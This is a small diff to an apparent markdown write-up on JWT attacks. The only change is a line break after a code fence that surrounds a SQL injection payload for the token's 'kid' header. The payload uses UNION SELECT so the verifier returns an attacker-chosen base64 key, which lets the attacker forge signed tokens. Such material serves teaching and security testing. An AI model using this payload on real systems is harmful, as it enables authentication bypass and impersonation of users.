@@ -179,7 +179,8 @@ bmV3X2tleQ==
 
 Replace kid with
 
-```"something_else' UNION SELECT 'bmV3X2tleQ==' FROM INFORMATION_SCHEMA.SYSTEM_USERS; --";
+```
+"something_else' UNION SELECT 'bmV3X2tleQ==' FROM INFORMATION_SCHEMA.SYSTEM_USERS; --";
 
 ```
 
